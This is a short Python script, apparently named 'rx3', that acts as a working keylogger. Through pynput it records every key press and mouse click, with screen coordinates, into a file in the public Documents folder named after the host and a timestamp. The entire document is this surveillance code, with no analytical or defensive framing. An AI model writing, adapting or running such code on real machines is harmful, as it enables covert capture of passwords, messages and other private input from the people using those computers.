#rx3
import socket
import pynput
import random
import time
import os

file="C:/Users/Public/Documents\/"+(socket.gethostname()+" . "+str(round(time.time()-18000)))+".rx3"
with open(file, 'w')as B:
    B.close()

def process_key_press(key):
    if str(key).startswith('Key'):
        key=str(key).lstrip('Key.')
    if str(key).startswith('u'):
        key=str(key).lstrip('u')
    with open(file, 'a') as B:
        B.write(str(key)+" ")
        B.close

def on_click(x,y,dx,dy):
    if dy == False:
        with open(file, 'a') as B:
            B.write("\n"+str(dx).lstrip("Button.")+' click at '+str(x)+" "+str(y)+"\n")
            B.close

keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
mouse_listener = pynput.mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()
keyboard_listener.join()
mouse_listener.join()
